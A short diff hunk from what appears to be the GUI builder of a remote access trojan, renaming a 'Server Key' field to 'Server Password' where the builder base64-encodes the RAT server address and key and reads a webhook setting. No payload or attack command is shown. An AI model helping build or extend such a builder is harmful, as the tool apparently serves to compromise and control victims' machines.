@@ -247,7 +247,7 @@ class App(customtkinter.CTk):
         rat_client = connection_config['Connect To Server'].get()
         if rat_client:
             server_addr = base64.b64encode(connection_config['Server Address'].get().replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()
-            server_key = base64.b64encode(connection_config['Server Key'].get().encode()).decode()
+            server_key = base64.b64encode(connection_config['Server Password'].get().encode()).decode()
             dynamic_webhook = connection_config['Dynamic Webhook'].get()
         else:
             webhook = connection_config['Webhook'].get()
